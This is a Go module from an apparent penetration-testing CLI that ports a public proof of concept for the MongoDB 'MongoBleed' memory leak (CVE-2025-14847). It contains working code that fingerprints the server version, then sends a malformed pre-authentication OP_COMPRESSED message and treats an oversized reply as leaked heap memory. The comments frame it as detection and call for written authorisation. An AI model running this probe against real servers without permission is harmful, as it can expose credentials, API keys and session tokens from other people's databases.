// cve_2025_14847 模块移植自 CVE-Exploits 仓库的 MongoBleed PoC（SanTaiZi 版扫描器）。
package cve_2025_14847

import (
	"bytes"
	"context"
	"encoding/binary"
	"fmt"
	"io"
	"net"
	"strconv"
	"strings"
	"time"

	"github.com/ctkqiang/nezha_cli/internal/model"
	"github.com/ctkqiang/nezha_cli/internal/modulekit"
	"github.com/ctkqiang/nezha_cli/pkg/logger"
)

const (
	// defaultPort 是 MongoDB 默认端口。
	defaultPort = 27017

	// dialTimeout 是连接与读写的超时预算。
	dialTimeout = 5 * time.Second
)

// fixedRange 描述一个主版本的受影响区间。
type fixedRange struct {
	major int
	max   string
	fixed string
	eol   bool
}

// affectedRanges 是 CVE-2025-14847 的受影响版本表（源自官方公告）。
var affectedRanges = []fixedRange{
	{major: 8, max: "8.2.2", fixed: "8.2.3"},
	{major: 8, max: "8.0.16", fixed: "8.0.17"},
	{major: 7, max: "7.0.27", fixed: "7.0.28"},
	{major: 6, max: "6.0.26", fixed: "6.0.27"},
	{major: 5, max: "5.0.31", fixed: "5.0.32"},
	{major: 4, max: "4.4.29", fixed: "4.4.30"},
	{major: 4, eol: true},
	{major: 3, eol: true},
}

// Module 是 MongoBleed 漏洞检测模块。
type Module struct{}

/*
New 创建 MongoBleed 漏洞检测模块实例。

参数:
  - 无。

返回:
  - model.Module: 模块实例。
*/
func New() model.Module {
	return &Module{}
}

/*
Meta 返回 MongoBleed 漏洞检测模块的元数据。

参数:
  - 无。

返回:
  - model.Meta: 模块名称、类别、说明与参数声明。
*/
func (m *Module) Meta() model.Meta {
	return model.Meta{
		Name:     "cve_2025_14847",
		Aliases:  []string{"mongobleed", "mongodb"},
		Category: modulekit.CategoryRecon,
		Summary:  "MongoDB zlib 内存泄露检测（MongoBleed）",
		Description: "通过畸形 OP_COMPRESSED 消息探测 MongoDB 是否返回未初始化堆内存（MongoBleed）。\n" +
			"适用于检测公网或内网暴露的 MongoDB 实例是否存在 CVE-2025-14847。\n" +
			"纯 Go 实现、无外部依赖；先以 isMaster 握手提取版本号判断受影响区间，\n" +
			"再按响应长度大于 1000 字节判定触发内存泄露。探测发生在认证之前，\n" +
			"可能触发目标日志告警并泄露目标内存数据，必须已获书面授权。",
		Usage:  "use cve_2025_14847\nset HOST 10.0.0.15\nset PORT 27017\nrun",
		Author: modulekit.Author,
		Impact: "高（发送恶意协议载荷并可能泄露目标内存数据）",
		Options: []model.Option{
			modulekit.Option("HOST", "MongoDB 主机名或 IP；必填，留空直接报错", true, ""),
			modulekit.Option("PORT", "MongoDB 端口，范围 1-65535；越界直接报错", false, "27017"),
		},
		References: []string{
			"https://github.com/ctkqiang/NezhaCli",
			"https://nvd.nist.gov/vuln/detail/CVE-2025-14847",
		},
	}
}

/*
Run 执行版本探测与内存泄露验证。

参数:
  - ctx (context.Context): 探测上下文。
  - options (model.Options): 已合并默认值的模块参数。
  - out (io.Writer): 结果输出目标。

返回:
  - error: 连接失败或参数非法时返回错误。
*/
func (m *Module) Run(ctx context.Context, options model.Options, out io.Writer) error {
	host := strings.TrimSpace(options.Get("HOST"))
	if host == "" {
		return fmt.Errorf("HOST 不能为空")
	}
	port := options.Int("PORT", defaultPort)
	if port < 1 || port > 65535 {
		return fmt.Errorf("PORT 超出范围: %d", port)
	}

	modulekit.Section(out, "探测配置")
	modulekit.KeyValues(out, [][2]string{
		{"目标", net.JoinHostPort(host, strconv.Itoa(port))},
		{"CVE", "CVE-2025-14847 (MongoBleed)"},
	}, 60)

	version, err := checkMongoVersion(ctx, host, port)
	if err != nil {
		logger.Warn("版本探测失败: %v", err)
	} else if version != "" {
		logger.Success("MongoDB 版本: %s", version)
		fmt.Fprintf(out, "版本: %s\n", version)
		if fixed := VersionVerdict(version); fixed != "" {
			fmt.Fprintf(out, "版本结论: %s\n", fixed)
		}
	}

	leaking, err := detectMongoBleed(ctx, host, port)
	if err != nil {
		return fmt.Errorf("内存泄露探测失败: %w", err)
	}

	modulekit.Section(out, "判定")
	if leaking {
		fmt.Fprintln(out, "[漏洞] CVE-2025-14847 存在：目标返回了超出正常应答的内存数据。")
		fmt.Fprintln(out, "[影响] 可能泄露数据库凭证、API 密钥、会话令牌等敏感信息。")
		fmt.Fprintln(out, "[建议] 升级到安全版本，或在启动参数中排除 zlib（--networkMessageCompressors）。")
		logger.Success("确认 CVE-2025-14847 漏洞存在")
	} else {
		fmt.Fprintln(out, "[安全] 未观察到泄露特征；仍建议核对版本表并保持网络隔离。")
	}
	return nil
}

/*
detectMongoBleed 发送畸形 OP_COMPRESSED 消息，按响应长度判定是否泄露内存。
响应大于 1000 字节即视为触发成功，与上游 PoC 判定阈值一致。

参数:
  - ctx (context.Context): 探测上下文。
  - host (string): 目标主机。
  - port (int): 目标端口。

返回:
  - bool: 触发内存泄露返回 true。
  - error: 连接或读写失败时返回错误。
*/
func detectMongoBleed(ctx context.Context, host string, port int) (bool, error) {
	address := net.JoinHostPort(host, strconv.Itoa(port))
	dialer := net.Dialer{Timeout: dialTimeout}
	conn, err := dialer.DialContext(ctx, "tcp", address)
	if err != nil {
		return false, err
	}
	defer conn.Close()

	deadline := time.Now().Add(dialTimeout)
	_ = conn.SetDeadline(deadline)

	compressedData := []byte{0x78, 0x9c, 0x01, 0x13, 0x00, 0xec, 0xfe, 0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a}
	messageLength := 16 + 1 + 4 + 4 + len(compressedData)

	exploitCommand := make([]byte, messageLength)
	binary.LittleEndian.PutUint32(exploitCommand[0:4], uint32(messageLength))
	binary.LittleEndian.PutUint32(exploitCommand[4:8], 1)
	binary.LittleEndian.PutUint32(exploitCommand[8:12], 0)
	binary.LittleEndian.PutUint32(exploitCommand[12:16], 2012)
	exploitCommand[16] = 0x00
	binary.LittleEndian.PutUint32(exploitCommand[17:21], 0xffffffff)
	binary.LittleEndian.PutUint32(exploitCommand[21:25], uint32(len(compressedData)))
	copy(exploitCommand[25:], compressedData)

	if _, err := conn.Write(exploitCommand); err != nil {
		return false, err
	}

	buffer := make([]byte, 65536)
	count, err := conn.Read(buffer)
	if err != nil {
		return false, err
	}
	return count > 1000, nil
}

/*
checkMongoVersion 发送 isMaster 握手并从响应中解析版本号。

参数:
  - ctx (context.Context): 探测上下文。
  - host (string): 目标主机。
  - port (int): 目标端口。

返回:
  - string: 解析出的版本号，未解析到返回空串。
  - error: 连接或读写失败时返回错误。
*/
func checkMongoVersion(ctx context.Context, host string, port int) (string, error) {
	address := net.JoinHostPort(host, strconv.Itoa(port))
	dialer := net.Dialer{Timeout: dialTimeout}
	conn, err := dialer.DialContext(ctx, "tcp", address)
	if err != nil {
		return "", err
	}
	defer conn.Close()

	deadline := time.Now().Add(dialTimeout)
	_ = conn.SetDeadline(deadline)

	handshakeCommand := []byte{
		0x37, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00,
		0xd4, 0x07, 0x00, 0x00,
		0x61, 0x64, 0x6d, 0x69, 0x6e, 0x2e, 0x24, 0x63, 0x6d, 0x64, 0x00,
		0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x01,
		0x13, 0x00, 0x00, 0x00,
		0x02, 0x69, 0x73, 0x4d, 0x61, 0x73, 0x74, 0x65, 0x72, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	}
	if _, err := conn.Write(handshakeCommand); err != nil {
		return "", err
	}

	buffer := make([]byte, 4096)
	count, err := conn.Read(buffer)
	if err != nil && err != io.EOF {
		return "", err
	}
	if count < 16 {
		return "", fmt.Errorf("响应过短")
	}

	response := buffer[:count]
	versionStart := bytes.Index(response, []byte("version"))
	if versionStart == -1 {
		return "", fmt.Errorf("响应不含 version 字段")
	}
	versionStart += 7
	for versionStart < count {
		char := response[versionStart]
		if char != ' ' && char != ':' && char != '=' && char != '"' && char != 0x00 {
			break
		}
		versionStart++
	}
	versionEnd := versionStart
	for versionEnd < count && ((response[versionEnd] >= '0' && response[versionEnd] <= '9') || response[versionEnd] == '.') {
		versionEnd++
	}
	if versionEnd == versionStart {
		return "", fmt.Errorf("版本号解析失败")
	}
	return string(response[versionStart:versionEnd]), nil
}

/*
VersionVerdict 判断版本是否落入受影响区间并给出中文结论。
该函数同时供模块输出与测试使用。

参数:
  - version (string): 探测到的版本号。

返回:
  - string: 中文结论；无法解析时返回空串。
*/
func VersionVerdict(version string) string {
	parts := strings.SplitN(strings.TrimSpace(version), ".", 2)
	major, err := strconv.Atoi(parts[0])
	if err != nil {
		return ""
	}

	for _, entry := range affectedRanges {
		if entry.major != major {
			continue
		}
		if entry.eol {
			return fmt.Sprintf("%d.x 已结束主流支持，全部受影响，建议升级到受支持版本", major)
		}
		comparison := compareVersion(version, entry.max)
		if comparison <= 0 {
			return fmt.Sprintf("受 CVE-2025-14847 影响，修复版本为 %s", entry.fixed)
		}
		return fmt.Sprintf("版本 %s 高于本分支修复线 %s，不受该分支影响", version, entry.fixed)
	}
	return fmt.Sprintf("版本 %s 不在内置受影响表中，请核对官方公告", version)
}

/*
compareVersion 按数值比较两个三段版本号。

参数:
  - a (string): 左操作数。
  - b (string): 右操作数。

返回:
  - int: a<b 为 -1，相等为 0，a>b 为 1。
*/
func compareVersion(a string, b string) int {
	aParts := strings.Split(a, ".")
	bParts := strings.Split(b, ".")
	for i := 0; i < 3; i++ {
		var aNumber, bNumber int
		if i < len(aParts) {
			aNumber, _ = strconv.Atoi(aParts[i])
		}
		if i < len(bParts) {
			bNumber, _ = strconv.Atoi(bParts[i])
		}
		switch {
		case aNumber < bNumber:
			return -1
		case aNumber > bNumber:
			return 1
		}
	}
	return 0
}
